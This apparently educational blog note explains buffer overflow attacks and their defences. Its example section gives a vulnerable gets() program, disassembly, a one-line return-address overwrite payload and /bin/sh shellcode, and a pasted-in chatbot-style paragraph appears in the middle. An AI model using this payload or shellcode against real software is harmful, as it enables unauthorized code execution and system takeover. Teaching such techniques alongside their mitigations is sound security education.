---
title: Buffer Overflow Attacks
date: 2024-03-07 21:00:00 UTC
categories: [ (CS) Learning Note, Software Security and Safety]
tags: [software engineering, software security]
pin: false
---

---

<center><font size='5'> Contents </font></center>

---

<!-- TOC -->
  * [What is a Buffer Overflow Attack?](#what-is-a-buffer-overflow-attack)
    * [Why Buffer Overflow Attacks are Feasible](#why-buffer-overflow-attacks-are-feasible)
  * [Some Types of Buffer Overflow Attacks](#some-types-of-buffer-overflow-attacks)
    * [Changing the Program Return Address](#changing-the-program-return-address)
    * [Shellcoding](#shellcoding)
    * [Return-to-Library (Ret2Libc)](#return-to-library-ret2libc)
  * [Example of Changing the Program Return Address](#example-of-changing-the-program-return-address)
  * [How to Avoid Buffer Overflow Attacks](#how-to-avoid-buffer-overflow-attacks)
    * [Input Validation](#input-validation)
    * [Use Safe Functions](#use-safe-functions)
    * [Stack Canaries](#stack-canaries)
    * [Address Space Layout Randomization (ASLR)](#address-space-layout-randomization-aslr)
    * [Non-Executable Stack](#non-executable-stack)
<!-- TOC -->

---

## What is a Buffer Overflow Attack?

A buffer overflow attack occurs when more data is written to a buffer than it can hold. Since buffers are allocated with a finite size in memory, surpassing this limit can overwrite adjacent memory locations. This vulnerability can lead to arbitrary code execution, system crashes, and a breach of system security.

### Why Buffer Overflow Attacks are Feasible

Buffer overflow attacks are feasible due to inadequate input validation and improper memory management in software. When an application fails to check the length of input, an attacker can deliberately supply excessive data to overflow the buffer, allowing them to manipulate the execution flow of the application.

## Some Types of Buffer Overflow Attacks

### Changing the Program Return Address

This classic buffer overflow attack involves overwriting the return address of a function with an address that points to malicious code. When the function returns, the processor jumps to the injected address, executing the attacker's code.

### Shellcoding

Shellcoding is a technique where the attacker injects a payload, known as a shellcode, into the memory. The shellcode is designed to spawn a shell or execute commands, giving the attacker control over the system. The attack is successful when the overflow manipulates the program's execution flow to jump to this shellcode.

### Return-to-Library (Ret2Libc)

The Ret2Libc attack circumvents the execution of arbitrary code by instead redirecting the execution flow to existing library functions, such as the system function in the C standard library (libc). This method is particularly effective when security mechanisms prevent executing code on the stack, as it leverages the legitimate code of the program’s own process.


Certainly, let's delve into a concrete example of a buffer overflow attack, specifically one that changes the program's return address to execute arbitrary code. This type of attack is a classic demonstration of exploiting a buffer overflow to gain unauthorized access or execute malicious code. For clarity, we'll use a hypothetical but realistic scenario based on a C program. It's important to note that executing or deploying this code on any system without authorization is illegal and unethical. This example is for educational purposes only.

## Example of Changing the Program Return Address

Imagine a simple C program which aims to simply get a string. This program, however, contains a critical vulnerability due to its unsafe use of the `gets` function.

```c
#include <stdio.h>
#include <string.h>

void danger()
{
  system("/tmp/danger.sh");
}

int main(int argc, char **argv)
{
  char buffer[100];
  gets(buffer); // Unsafe use of gets(), which doesn't check input size
}
```

An attacker can exploit this vulnerability to overwrite the stack, including the return address of `main()`, to point to the address of a malicious function, such as `danger()`. **In this way, although the malicious function `danger()` is never called, it will be executed.** This is typically done in steps:

- **Decompile the target program**. An attacker can obtain the assembly code of a program by using the decompile command `objdump -d example` to know the rough structure of the program and the return address of each function. As shown below, the address of `danger()` can be known as `0804849b` .

```
...
0804849b <danger>:
 804849b:       55                      push   %ebp
 804849c:       89 e5                   mov    %esp,%ebp
 804849e:       83 ec 08                sub    $0x8,%esp
 80484a1:       83 ec 0c                sub    $0xc,%esp
 80484a4:       68 90 85 04 08          push   $0x8048590
 80484a9:       e8 c2 fe ff ff          call   8048370 <system@plt>
 80484ae:       83 c4 10                add    $0x10,%esp
 80484b1:       90                      nop
 80484b2:       c9                      leave
 80484b3:       c3                      ret

080484b4 <main>:
 80484b4:       8d 4c 24 04             lea    0x4(%esp),%ecx
 80484b8:       83 e4 f0                and    $0xfffffff0,%esp
 80484bb:       ff 71 fc                pushl  -0x4(%ecx)
 80484be:       55                      push   %ebp
 80484bf:       89 e5                   mov    %esp,%ebp
 80484c1:       51                      push   %ecx
 80484c2:       81 ec 84 00 00 00       sub    $0x84,%esp
 ...
```

- **Creating the Input**. The payload would consist of:
  - 100 bytes to fill the buffer.
  - 4 bytes to overwrite the saved frame pointer (on architectures where this is required).
  - the new return address `0804849b`, pointing to the location of the malicious function `danger()`.

- **Execution**. When `gets()` reads this specially crafted input, it causes a buffer overflow, overwriting the return address on the stack. When `main()` returns, instead of returning to `main()`, the CPU jumps to the malicious function `danger()`.
  - As mentioned above, this can be done by executing the following command: `python -c 'print "A" * 104 + "\x9b\x84\x04\x08"' | . /example`

- **Inject Shellcode or Ret2Libc**. Attackers can also perform more malicious operations by adding shellcode to the input or finding ways to execute existing code in memory (e.g., Return-to-Libc attack).

**Shellcode example:**

This is the shellcode of `/bin/sh`, which will spawn a shell when it is injected into memory for execution

``` 
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb
0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

> With this example, we can understand exactly how buffer overflow attacks work. But Nowadays, due to continuous optimisation of compilers, the above attacks are generally not easily succeeded.
{: .prompt-tip }


## How to Avoid Buffer Overflow Attacks

Mitigating buffer overflow vulnerabilities requires a proactive approach to secure coding and system configuration. Here are key strategies for prevention:

### Input Validation

Ensure all input is properly validated for length and content before processing. This simple step can prevent oversized data from causing a buffer overflow.

### Use Safe Functions

Avoid using unsafe functions known to be vulnerable to buffer overflows, such as `strcpy()` in C. Instead, use safer alternatives like `strncpy()`, which limits the amount of data copied to a buffer.

### Stack Canaries

Stack canaries are a security mechanism that places a small, random value (the "canary") between the buffer and control data on the stack. A buffer overflow that overwrites the return address will also overwrite the canary. The integrity of the canary is checked before a function returns; if it has changed, the program aborts, preventing the overflow from hijacking the execution flow.

### Address Space Layout Randomization (ASLR)

ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap, and libraries. This randomness makes it more difficult for attackers to predict the memory addresses needed for exploits like Ret2Libc.

### Non-Executable Stack

Configuring the stack as non-executable prevents the execution of any code residing in the stack, thwarting shellcoding attacks. This is often implemented through hardware support, such as the NX bit, or software solutions like ExecShield.
